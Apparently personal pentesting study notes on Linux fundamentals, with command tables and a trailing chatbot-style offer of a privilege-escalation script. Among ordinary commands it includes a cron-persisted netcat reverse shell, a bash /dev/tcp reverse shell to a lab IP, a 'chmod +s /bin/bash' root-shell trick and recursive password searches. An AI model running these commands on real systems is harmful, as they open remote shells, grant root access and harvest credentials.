# Linux Fundarmentals
This page documents core Linux fundamentals. 

## Introduction
Linux is the backbone of modern servers, cloud infrastructure, cybersecurity tools, and hacking environments.  
It offers **power, flexibility, automation, and control** via its command-line interface - making it **ideal for pentesting and scripting exploits**.

# Linux Structure
Linux consists of:
* **Kernel** → Manages CPU, memory, processes.
* **Shell** → Interface for user commands.
* **File System** → Stores data & configurations.
List kernel modules – find vulnerable ones: `lsmod`

# File System Hierarchy
| Directory  | Purpose                                            |
| ---------- | -------------------------------------------------- |
| `/`        | Root of the filesystem                             |
| `/bin`     | Essential binaries                                 |
| `/etc`     | Config files                                       |
| `/var/log` | Logs (good for enumeration)                        |
| `/home`    | User home directories                              |
| `/tmp`     | Temporary files (writeable – useful for exploits!) |
| `/dev`     | Device files                                       |
| `/proc`    | Kernel & process info                              |
![File System Hierarchy](https://www.linuxfoundation.org/hs-fs/hubfs/Imported_Blog_Media/standard-unix-filesystem-hierarchy-1.png?width=1817&height=1001&name=standard-unix-filesystem-hierarchy-1.png)

# Linux Distributions
| Category   | Distros                                     |
| ---------- | ------------------------------------------- |
| Pentesting | Kali, ParrotOS                              |
| Enterprise | RedHat, CentOS, Rocky                       |
| Server     | Debian, Ubuntu Server                       |
| Desktop    | Ubuntu, Linux Mint                          |
| UNIX-based | **Solaris** (often used in legacy systems!) |

identify OS: `hostnamectl`
identify OS: `lsb_release -a`
identify OS: `uname -a`
determine Linux distribution: `cat /etc/*-release`

# 📖 Getting Help
| Command          | Purpose          |
| ---------------- | ---------------- |
| `man <cmd>`      | View manual      |
| `<cmd> --help`   | Get help options |
| `apropos search` | Search manpages  |
Example: `man sudo` or `grep -r "ssh" /usr/share/man/`

# 🖥️ System Information
| Command    | Purpose      |
| ---------- | ------------ |
| `uname -a` | Kernel, hostname, version, os info  |
| `df -h`    | Disk usage   |
| `free -m`  | Memory usage |
| `lscpu`    | CPU info     |

Example: `cat /proc/version` or `ps aux | grep root`

---

## Working with Linux

# Navigation

| Command  | Purpose                 |
| -------- | ----------------------- |
| `pwd`    | Print current directory |
| `cd`     | Change directory        |
| `ls -la` | View files incl. hidden |

# Working with Files & Directories

Creating a file: `touch exploit.sh`
Copying a file: `cp /etc/passwd /tmp/pass_backup`

# Editing Files

| Tool   | Purpose         |
| ------ | --------------- |
| `nano` | Easy editor     |
| `vim`  | Advanced editor |
| `sed`  | Inline editing  |

Passing test into a file: `echo "hello world" >> notes.txt`

# Find Files & Directories
Find all text tiles in root: `find / -name "*.txt" 2>/dev/null`
Find SUID binaries: `find / -perm -4000 2>/dev/null`
Find congig files where secrets may be: `find / -name "*.conf" 2>/dev/null`
Fine Passwords in root: `grep -r "password" / 2>/dev/null`


# Filter Contents 
Example: `cat file.txt | grep -E "[0-9]{10}"`

# Permissions Management
| Command           | Purpose            |
| ----------------- | ------------------ |
| `chmod`           | Change permissions |
| `chown`           | Change ownership   |
| `getfacl/setfacl` | ACL management     |

Example (priv-esc): `chmod +s /bin/bash`   # Bad! Enables root shell
Finds writable files: `find / -writable -type f 2>/dev/null`

---

## System Management

# User Management
Look for users: `cat /etc/passwd`
Create user: `sudo useradd testuser`

# Package Management

| Distro        | Tool                |
| ------------- | ------------------- |
| Debian/Ubuntu | `apt`, `dpkg`       |
| RedHat        | `yum`, `dnf`, `rpm` |
| Arch          | `pacman`            |
| Solaris       | `pkgadd`, `pkgrm`   |

Example install command: `apt install net-tools`

# Service & Process Management
Check service status: `systemctl status nginx`
Check services with filtering: `ps aux | grep root`

# Task Scheduling (Cron)
List scheduled tasks: `crontab -l`
Create scheduled task `echo "* * * * * /bin/bash -c 'nc -e /bin/bash 10.10.14.8 4444'" >> cronjob`

# Network Services
Check network interfaces: `nano /etc/network/interfaces/xx`  

Netstat is used to display active network connections and their associated ports.  
Check active connections: `netstat -ano`

# 💻 Web Services
Look at a website via CLI: `curl http://10.10.10.5`
Download files from FTP or HTTP servers: `wget http://10.10.10.5`
Start the Python 3 web server:`python3 -m http.server 80`

# Backup & Restore
Backup a local Directory to our Remote Server: `rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory`
Zip a folder: `tar -czvf backup.tar.gz /etc/`

# 📁 File System Management
List mounted items: `df -h`
List disks: `sudo fdisk -l`
Mounting a disk or file system: `mount /dev/sda1 /mnt` or via fstab `nano /etc/fstab`
```bash

```

```bash
df -h
```

---

# 📜 System Logs

```bash
journalctl -u ssh
```

```bash
grep "auth" /var/log/*
```

---

# 📉 Monitoring

```bash
top
```

```bash
htop
```

---

## 📦 Containerization (Intro)

| Tool           | Usage               |
| -------------- | ------------------- |
| Docker         | Run isolated apps   |
| Podman         | Rootless containers |
| LXC            | Lightweight VMs     |
| systemd-nspawn | Linux jail-like     |

**Example:**

```bash
docker run -it kalilinux/kali-rolling bash
```

---

## 🌐 Networking – Linux

```bash
ip a
```

```bash
nmcli device status
```

### Remote Desktop Protocols

| Protocol | Tool          |
| -------- | ------------- |
| SSH      | `ssh user@ip` |
| RDP      | `xfreerdp`    |
| VNC      | `vncviewer`   |

---

### 🔥 Firewalls

```bash
ufw status
```

```bash
iptables -L
```
reverse shell):`bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`

---
---

# 📋 Linux Cheat Sheet (Quick Reference)

| Command             | Description         |
| ------------------- | ------------------- |
| `man <tool>`        | Opens man pages     |
| `<tool> -h`         | Prints help         |
| `apropos <keyword>` | Search manpages     |
| `whoami`            | Print current user  |
| `id`                | User identity       |
| `uname -a`          | OS info             |
| `hostname`          | Host name           |
| `ifconfig`          | Network config      |
| `netstat`           | Connections         |
| `ss`                | Investigate sockets |
| `lsof`              | List open files     |
| `systemctl`         | Manage services     |
| `kill`              | End process         |
| `curl`              | Transfer data       |
| `wget`              | Download files      |
| `find`              | Search files        |
| `grep`              | Search patterns     |
| `chmod`             | File permissions    |
| `chown`             | Change owner        |

---

Let me know if you'd like:

* **Beginner → Advanced HTB Linux Path**
* **Privilege Escalation Automation Script**
* **PDF printable version**
* **Flashcards for memory training**

🔥 Ready for the next level?

```bash
sudo -l        # Check for privilege escalation vectors
```



